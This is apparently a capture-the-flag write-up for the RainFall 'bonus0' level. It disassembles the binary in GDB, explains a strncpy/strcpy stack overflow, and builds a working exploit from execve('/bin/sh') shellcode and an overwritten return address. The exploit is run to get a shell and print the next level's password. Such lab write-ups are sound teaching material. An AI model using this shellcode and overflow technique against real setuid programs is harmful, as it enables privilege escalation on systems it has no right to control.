# Rainfall

## Bonus0

```sh
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048334  _init
0x08048380  read
0x08048380  read@plt
0x08048390  strcat
0x08048390  strcat@plt
0x080483a0  strcpy
0x080483a0  strcpy@plt
0x080483b0  puts
0x080483b0  puts@plt
0x080483c0  __gmon_start__
0x080483c0  __gmon_start__@plt
0x080483d0  strchr
0x080483d0  strchr@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  strncpy
0x080483f0  strncpy@plt
0x08048400  _start
0x08048430  __do_global_dtors_aux
0x08048490  frame_dummy
0x080484b4  p #    <-------- 
0x0804851e  pp #   <--------
0x080485a4  main # <--------
0x080485d0  __libc_csu_init
0x08048640  __libc_csu_fini
0x08048642  __i686.get_pc_thunk.bx
0x08048650  __do_global_ctors_aux
0x0804867c  _fini
```

```sh
(gdb) disas main
Dump of assembler code for function main:
   0x080485a4 <+0>:     push   %ebp
   0x080485a5 <+1>:     mov    %esp,%ebp
   0x080485a7 <+3>:     and    $0xfffffff0,%esp
   0x080485aa <+6>:     sub    $0x40,%esp
   0x080485ad <+9>:     lea    0x16(%esp),%eax             # buf
   0x080485b1 <+13>:    mov    %eax,(%esp)
   0x080485b4 <+16>:    call   0x804851e <pp>              # pp(buf)
   0x080485b9 <+21>:    lea    0x16(%esp),%eax
   0x080485bd <+25>:    mov    %eax,(%esp)
   0x080485c0 <+28>:    call   0x80483b0 <puts@plt>        # puts(buf)
   0x080485c5 <+33>:    mov    $0x0,%eax
   0x080485ca <+38>:    leave
   0x080485cb <+39>:    ret
End of assembler dump.
```
```sh
(gdb) disas p
Dump of assembler code for function p:
   0x080484b4 <+0>:     push   %ebp
   0x080484b5 <+1>:     mov    %esp,%ebp
   0x080484b7 <+3>:     sub    $0x1018,%esp
   0x080484bd <+9>:     mov    0xc(%ebp),%eax              # msg
   0x080484c0 <+12>:    mov    %eax,(%esp)
   0x080484c3 <+15>:    call   0x80483b0 <puts@plt>        # puts(msg)
   0x080484c8 <+20>:    movl   $0x1000,0x8(%esp)           # 4096
   0x080484d0 <+28>:    lea    -0x1008(%ebp),%eax          # tmp
   0x080484d6 <+34>:    mov    %eax,0x4(%esp)
   0x080484da <+38>:    movl   $0x0,(%esp)
   0x080484e1 <+45>:    call   0x8048380 <read@plt>        # read(0, tmp, 4096)
   0x080484e6 <+50>:    movl   $0xa,0x4(%esp)              # '\n'
   0x080484ee <+58>:    lea    -0x1008(%ebp),%eax
   0x080484f4 <+64>:    mov    %eax,(%esp)
   0x080484f7 <+67>:    call   0x80483d0 <strchr@plt>      # strchr(tmp, '\n')
   0x080484fc <+72>:    movb   $0x0,(%eax)                 # cut at newline
   0x080484ff <+75>:    lea    -0x1008(%ebp),%eax
   0x08048505 <+81>:    movl   $0x14,0x8(%esp)             # 20
   0x0804850d <+89>:    mov    %eax,0x4(%esp)
   0x08048511 <+93>:    mov    0x8(%ebp),%eax              # dest
   0x08048514 <+96>:    mov    %eax,(%esp)
   0x08048517 <+99>:    call   0x80483f0 <strncpy@plt>     # strncpy(dest, tmp, 20)
   0x0804851c <+104>:   leave
   0x0804851d <+105>:   ret
End of assembler dump.
```
```sh
(gdb) disas pp
Dump of assembler code for function pp:
   0x0804851e <+0>:     push   %ebp
   0x0804851f <+1>:     mov    %esp,%ebp
   0x08048521 <+3>:     push   %edi
   0x08048522 <+4>:     push   %ebx
   0x08048523 <+5>:     sub    $0x50,%esp
   0x08048526 <+8>:     movl   $0x80486a0,0x4(%esp)        # "-"
   0x0804852e <+16>:    lea    -0x30(%ebp),%eax            # a[20]
   0x08048531 <+19>:    mov    %eax,(%esp)
   0x08048534 <+22>:    call   0x80484b4 <p>               # p(a, "-")
   0x08048539 <+27>:    movl   $0x80486a0,0x4(%esp)
   0x08048541 <+35>:    lea    -0x1c(%ebp),%eax            # b[20]
   0x08048544 <+38>:    mov    %eax,(%esp)
   0x08048547 <+41>:    call   0x80484b4 <p>               # p(b, "-")
   0x0804854c <+46>:    lea    -0x30(%ebp),%eax            # a
   0x0804854f <+49>:    mov    %eax,0x4(%esp)
   0x08048553 <+53>:    mov    0x8(%ebp),%eax              # out
   0x08048556 <+56>:    mov    %eax,(%esp)
   0x08048559 <+59>:    call   0x80483a0 <strcpy@plt>      # strcpy(out, a)
   0x0804855e <+64>:    mov    $0x80486a4,%ebx             # 2-byte separator
   0x08048563 <+69>:    mov    0x8(%ebp),%eax
   0x08048566 <+72>:    movl   $0xffffffff,-0x3c(%ebp)
   0x0804856d <+79>:    mov    %eax,%edx
   0x0804856f <+81>:    mov    $0x0,%eax
   0x08048574 <+86>:    mov    -0x3c(%ebp),%ecx
   0x08048577 <+89>:    mov    %edx,%edi
   0x08048579 <+91>:    repnz scas %es:(%edi),%al          # strlen(out)
   0x0804857b <+93>:    mov    %ecx,%eax
   0x0804857d <+95>:    not    %eax
   0x0804857f <+97>:    sub    $0x1,%eax
   0x08048582 <+100>:   add    0x8(%ebp),%eax              # out + strlen(out)
   0x08048585 <+103>:   movzwl (%ebx),%edx
   0x08048588 <+106>:    mov    %dx,(%eax)                  # append 2 bytes
   0x0804858b <+109>:   lea    -0x1c(%ebp),%eax            # b
   0x0804858e <+112>:   mov    %eax,0x4(%esp)
   0x08048592 <+116>:   mov    0x8(%ebp),%eax
   0x08048595 <+119>:   mov    %eax,(%esp)
   0x08048598 <+122>:   call   0x8048390 <strcat@plt>      # strcat(out, b)
   0x0804859d <+127>:   add    $0x50,%esp
   0x080485a0 <+130>:   pop    %ebx
   0x080485a1 <+131>:   pop    %edi
   0x080485a2 <+132>:   pop    %ebp
   0x080485a3 <+133>:   ret
End of assembler dump.
```

- `strncpy(dest, src, 20)` does not append `'\0'` when the input is ≥ 20 bytes.
- `strcpy(out, a)` does not stop until it hits a `'\0'`

So we try 20 bytes in `A` and 20 bytes in `B`. The program crashes.

We try again with a cyclic of at least 20 bytes in input B (`Aa0Aa1Aa2Aa3Aa4Aa5Aa…`) and look at the `EIP` after the segfault:

```
eip = 0x41336141 = "Aa3A" -> offset 9
```

We now know we can overwrite `EIP`

When a function returns, it does not zero its stack frame, we will use `tmp` to store our shellcode and put tmp's address in `EIP` since `A` and `B` are capped at 20 bytes and `tmp` can hold up to 4096

`p()` always overwrites the first 20 bytes of tmp so:
- `p(a)` we first send 21 random bytes first followed by the shellcode
- `p(b)` we don't care about tmp itself, but `b` must hold the payload that changes `main`'s return `EIP` so those 20 bytes overwrite the start of `tmp`. Thats why the 21 dummy bytes exist on `p(a)` so they get overwritten instead of the shellcode located after them

The shellcode therefore sits at `tmp+21`, that's the address we'll put in `EIP`

So our payload will look like this:

### A input
```sh
21 random padding chars
Shellcode
```

#### B input
```sh
9 random padding chars
tmp+21 address
7 random padding chars #(to reach 20 bytes)
```

Let's try to retrieve tmp + 21 address:
```sh
bonus0@RainFall:~$ gdb bonus0 
(gdb) break *0x080484d0
Breakpoint 1 at 0x80484d0
(gdb) run
Starting program: /home/user/bonus0/bonus0 
 - 

Breakpoint 1, 0x080484d0 in p ()
(gdb) p/x $ebp-0x1008+21
$1 = 0xbfffe695
```

We build our payload:
```sh
bonus0@RainFall:~$ (python -c 'print "X"*21 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A"*9 + "\x95\xe6\xff\xbf" + "B"*7'; cat) | ./bonus0
 - 
 - 
XXXXXXXXXXXXXXXXXXXXAAAAAAAAA����BBBBBBB��� AAAAAAAAA����BBBBBBB���
whoami
Segmentation fault (core dumped)
```

It crashes, so the stack must not be perfectly aligned between `./bonus0` and `gdb bonus0`

We have two solutions to fix this, either add some NOP instructions between the 21 padding chars and the shellcode to overcome the alignment issue or try to check where the differences comes from

let's try the 2nd solution first since it let us keep using the same kind of payload

GDB often adds some env variables (mostly `LINES` and `COLUMNS`) since it inherits from `readline`, we can check it by using an empty env + GDB:

```sh
bonus0@RainFall:~$ env -i gdb ./bonus0

(gdb) show env
LINES=30
COLUMNS=144
```

so we just need to re-retrieve the address of `tmp+21` after removing those two variables

```sh
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) b *0x080484d0
Breakpoint 1 at 0x80484d0
(gdb) run
Starting program: /home/user/bonus0/bonus0 
 - 

Breakpoint 1, 0x080484d0 in p ()
(gdb) p/x $ebp-0x1008+21
$1 = 0xbfffe6c5 # we get a different address than before
```

```sh
bonus0@RainFall:~$ (python -c 'print "X"*21 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A"*9 + "\xc5\xe6\xff\xbf" + "B"*7'; cat) | ./bonus0
 - 
 - 
XXXXXXXXXXXXXXXXXXXXAAAAAAAAA����BBBBBBB��� AAAAAAAAA����BBBBBBB���
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```